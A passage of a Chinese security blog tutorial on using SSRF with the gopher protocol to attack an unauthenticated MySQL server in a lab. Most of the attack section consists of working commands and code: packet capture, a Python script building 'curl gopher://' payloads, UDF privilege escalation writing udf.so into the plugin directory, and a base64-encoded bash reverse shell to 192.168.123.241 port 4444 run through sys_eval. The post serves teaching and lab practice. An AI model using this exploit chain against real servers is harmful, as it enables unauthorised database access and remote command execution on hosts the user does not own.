+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 创建用户</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;admin&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"># 授予权限</span><br><span class="line">GRANTUSAGE <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;admin&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"># 刷新权限表</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+<h4 id="抓取MySQL数据包"><a href="#抓取MySQL数据包" class="headerlink" title="抓取MySQL数据包"></a>抓取MySQL数据包</h4><p>首先，开一个窗口,<code>tcpdump -i lo port 3306 -w mysql.pcapng</code>，开始抓取3306的数据包。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/ZvkBgcTz5hwH6Mq.png" alt="image-20211201210243808"></p>
+<p>然后在另一个窗口，开启MySQL终端，查询一些信息。最后记得<code>exit;</code>，不然会出问题。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/nvoQl29bxypuXtS.png" alt="image-20211201213500304"></p>
+<p>中止 tcpdump 使用 Wireshark 打开 <code>mysql.pcapng</code> 数据包，追踪 TCP 流</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/hmQSB3xTNMZqkLb.png" alt="image-20211201214035748"></p>
+<p>然后提取<code>request</code>包，并且显示为原始数据（Raw）</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/Sh8B1zoFIpZ75Xg.png" alt="image-20211201214415615"></p>
+<p>将其整理成 1 行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bd00000184a6bf20000000012d000000000000000000000000000000000000000d00000061646d696e00006d7973716c5f6e61746976655f70617373776f7264007f035f6f73054c696e75780c5f636c69656e745f6e616d650a6c69626d617269616462045f7069640534313534390f5f636c69656e745f76657273696f6e06332e312e3134095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c0c5f7365727665725f686f7374093132372e302e302e31210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031120000000353454c45435420444154414241534528290600000002666c6167730f0000000373686f77206461746162617365730c0000000373686f77207461626c65730600000004666c616700130000000373656c656374202a2066726f6d20666c61670100000001</span><br></pre></td></tr></table></figure>
+<h4 id="生成-gopher-数据流"><a href="#生成-gopher-数据流" class="headerlink" title="生成 gopher 数据流"></a>生成 gopher 数据流</h4><p>然后使用如下的 Python3 脚本将数据转化为 url 编码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">results</span>(<span class="params">s</span>):</span></span><br><span class="line">    a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span>+<span class="string">&quot;%&quot;</span>.join(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s=sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(results(s))</span><br></pre></td></tr></table></figure>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/dhtsWkjgfHJ341p.png" alt="image-20211201215230891"></p>
+<p>本地 curl 请求这个 gopher 协议的数据包看看</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/AC1rSjyPcEweBv2.png" alt="image-20211201215553354"></p>
+<p>将生成的payload再进行URL编码，结合SSRF漏洞进行利用</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/JvM8jOt9CRXb3EH.png" alt="image-20211201215924201"></p>
+<h3 id="漏洞利用-UDF提权"><a href="#漏洞利用-UDF提权" class="headerlink" title="漏洞利用-UDF提权"></a>漏洞利用-UDF提权</h3><blockquote>
+<p>提权前需要注意：</p>
+<ul>
+<li>mysql（mariadb）必须使用root用户启动（不通过service或者systemctl）</li>
+<li><code>secure_file_priv</code>变量的值需要为空</li>
+</ul>
+</blockquote>
+<h4 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h4><p>首先来寻找 MySQL 的插件目录，原生的 MySQL 命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h127.0.0.1 -uadmin -e <span class="string">&quot;show variables like &#x27;%plugin%&#x27;;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>然后tcpdump 监听，使用 Wirshark 分析导出原始数据。这里为了方便就直接查询了，步骤和上面是一样的。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/02/VGhrYdHMuFK9AWp.png" alt="image-20211202124657883"></p>
+<h4 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h4><p>拿到 MySQL 的插件目录为：<code>/usr/lib/x86_64-linux-gnu/mariadb19/plugin/</code></p>
+<p>接着来写入动态链接库，原生的 MySQL 命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 因为 payload 太长 这里就先进入 MySQL 控制台</span></span><br><span class="line">$ mysql -h127.0.0.1 -uroot</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; SELECT 0x7f454c4602...(省略大量payload)...0000000 INTO DUMPFILE <span class="string">&#x27;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>关于 UDF 提权的 UDF 命令，推荐参考国光大佬的这个 UDF 提权辅助页面：</p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
+</blockquote>
+<p>tcpdump 监听到的原始数据后，转换 gopher 协议，URL编码后，SSRF 攻击写入动态链接库。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/02/6ygfw4p97OJ2S1A.png" alt="image-20211202125541235"></p>
+<p> 可以看到udf.so 已经成功写入到 MySQL 的插件目录下了</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/02/napwP5A6x9WGftr.png" alt="image-20211202125633560"></p>
+<p>以此类推，创建自定义函数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h127.0.0.1 -uroot -e <span class="string">&quot;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>最后通过创建的自定义函数并执行系统命令将 shell 弹出来，原生命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h127.0.0.1 -uroot -e <span class="string">&quot;select sys_eval(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyMy4yNDEvNDQ0NCAwPiYx|base64 -d|bash -i&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+<p>测试过程中默认情况下弹不出来，所以这里将原始的 bash 反弹 shell 命令给编码了：</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/02/I5YukSqGHNZX4PJ.png" alt="image-20211202134310277"></p>
+<blockquote>
+<p>这里使用的是国光大佬的命令执行辅助工具：</p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools.html">https://www.sqlsec.com/tools.html</a></p>
+</blockquote>
+<p>tcpdump 监听到的原始数据后，转换 gopher 协议，URL二次编码请求一下，然后 SSRF 攻击成功弹出 shell。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/02/lZxyD2iRTCBGJuh.png" alt="image-20211202135909572"></p>
+<blockquote>
+<p>上述payload，除了写入动态链接库外，其他的都可以使用Gopherus工具生成</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/02/KXQfLtb3hC84J7G.png" alt="image-20211202140513352"></p>
+</blockquote>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-58455-1-1.html">SSRF系列之攻击FastCGI_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/itbsl/p/9828776.html">CGI 和 FastCGI 协议的运行原理 - itbsl - 博客园 (cnblogs.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/263342.html">利用SSRF攻击内网FastCGI协议 - FreeBuf网络安全行业门户</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2021/05/ssrf.html">手把手带你用 SSRF 打穿内网 | 国光 (sqlsec.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/510/">SSRF To RCE in MySQL (seebug.org)</a></li>
+<li><a target="_blank" rel="noopener" href="https://coomrade.github.io/2018/10/28/SSRF攻击MySQL/">SSRF攻击MySQL | C0mRaDe’s Blog (coomrade.github.io)</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ulysses</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://plumeria.ltd/post/ecd40306.html">https://plumeria.ltd/post/ecd40306.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://plumeria.ltd" target="_blank">Ulysses'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SSRF/">SSRF</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/ssrf2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/49deb66d.html"><img class="next-cover" src="/img/gif/loading4.gif" data-original="/img/cover/ssrf2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">利用SSRF渗透内网主机·上</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/7cd8d249.html" title="SSRF漏洞原理"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/ssrf.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-25</div><div class="title">SSRF漏洞原理</div></div></a></div><div><a href="/post/afbbea8e.html" title="SSRF的利用协议"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/gopher.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-27</div><div class="title">SSRF的利用协议</div></div></a></div><div><a href="/post/49deb66d.html" title="利用SSRF渗透内网主机·上"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/ssrf2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-29</div><div class="title">利用SSRF渗透内网主机·上</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ulysses</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/UlyssesTakusen"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">记录学习与生活~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%94%BB%E5%87%BBFastCGI%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">SSRF攻击FastCGI执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FastCGI%E4%B8%8EPHP-FPM"><span class="toc-number">1.1.</span> <span class="toc-text">FastCGI与PHP-FPM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FastCGI"><span class="toc-number">1.1.1.</span> <span class="toc-text">FastCGI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-fpm"><span class="toc-number">1.1.2.</span> <span class="toc-text">php-fpm</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-FPM%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">PHP-FPM攻击实现原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83%E4%B8%8E%E4%BE%9D%E8%B5%96"><span class="toc-number">1.3.1.</span> <span class="toc-text">安装环境与依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEphp-fpm"><span class="toc-number">1.3.2.</span> <span class="toc-text">配置php-fpm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.3.</span> <span class="toc-text">启动环境</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E5%88%A9%E7%94%A8MySQL%E6%9C%AA%E6%8E%88%E6%9D%83%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">SSRF利用MySQL未授权攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.</span> <span class="toc-text">MySQL通信协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F"><span class="toc-number">2.1.1.</span> <span class="toc-text">MySQL连接方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="toc-number">2.1.2.</span> <span class="toc-text">MySQL认证过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞利用-查询数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%A9%BA%E5%AF%86%E7%A0%81%E7%94%A8%E6%88%B7"><span class="toc-number">2.2.1.</span> <span class="toc-text">配置空密码用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%93%E5%8F%96MySQL%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">2.2.2.</span> <span class="toc-text">抓取MySQL数据包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90-gopher-%E6%95%B0%E6%8D%AE%E6%B5%81"><span class="toc-number">2.2.3.</span> <span class="toc-text">生成 gopher 数据流</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-UDF%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞利用-UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%8F%92%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="toc-number">2.3.1.</span> <span class="toc-text">寻找插件目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="toc-number">2.3.2.</span> <span class="toc-text">写入动态链接库</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">3.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/ecd40306.html" title="利用SSRF渗透内网主机·中"><img src="/img/gif/loading4.gif" data-original="/img/cover/ssrf2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用SSRF渗透内网主机·中"/></a><div class="content"><a class="title" href="/post/ecd40306.html" title="利用SSRF渗透内网主机·中">利用SSRF渗透内网主机·中</a><time datetime="2021-12-02T14:00:00.000Z" title="发表于 2021-12-02 22:00:00">2021-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/49deb66d.html" title="利用SSRF渗透内网主机·上"><img src="/img/gif/loading4.gif" data-original="/img/cover/ssrf2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用SSRF渗透内网主机·上"/></a><div class="content"><a class="title" href="/post/49deb66d.html" title="利用SSRF渗透内网主机·上">利用SSRF渗透内网主机·上</a><time datetime="2021-11-29T14:00:00.000Z" title="发表于 2021-11-29 22:00:00">2021-11-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/afbbea8e.html" title="SSRF的利用协议"><img src="/img/gif/loading4.gif" data-original="/img/cover/gopher.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF的利用协议"/></a><div class="content"><a class="title" href="/post/afbbea8e.html" title="SSRF的利用协议">SSRF的利用协议</a><time datetime="2021-11-27T05:00:00.000Z" title="发表于 2021-11-27 13:00:00">2021-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/7cd8d249.html" title="SSRF漏洞原理"><img src="/img/gif/loading4.gif" data-original="/img/cover/ssrf.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF漏洞原理"/></a><div class="content"><a class="title" href="/post/7cd8d249.html" title="SSRF漏洞原理">SSRF漏洞原理</a><time datetime="2021-11-25T05:00:00.000Z" title="发表于 2021-11-25 13:00:00">2021-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/b7b7b91b.html" title="JSONP劫持漏洞"><img src="/img/gif/loading4.gif" data-original="/img/cover/jsonp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JSONP劫持漏洞"/></a><div class="content"><a class="title" href="/post/b7b7b91b.html" title="JSONP劫持漏洞">JSONP劫持漏洞</a><time datetime="2021-11-21T05:00:00.000Z" title="发表于 2021-11-21 13:00:00">2021-11-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Ulysses</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/algolia.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'iuIup4lvgEwLDu3U8Qc3GOXd-gzGzoHsz',
+      appKey: 'Ls9mJKS2MmvbfsPbPCeb2cnA',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      master: '5671db8c5f953943b68468c62e317e7e,007d3a0fdf1072ff1db83a005457a3c9,503ee756200f9eba794e5467c89e98f8'.split(','),
+      friends: ''.split(','),
+      tagMeta: '博主,小伙伴,访客'.split(','),
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="/js/smooth-scrolling.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/img/gif/loading4.gif" data-original="/img/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e2e31796.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/yunsuo.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-23</span><a class="blog-slider__title" href="post/e2e31796.html" alt="">WAF-Bypass之SQL注入绕过云锁</a><div class="blog-slider__text">本文主要介绍:如何科学地绕过云锁WAF</div><a class="blog-slider__button" href="post/e2e31796.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e1e1fb64.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/waf.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-14</span><a class="blog-slider__title" href="post/e1e1fb64.html" alt="">WAF-Bypass之WAF介绍与分析</a><div class="blog-slider__text">本文主要介绍:WAF的工作原理以及部署方式</div><a class="blog-slider__button" 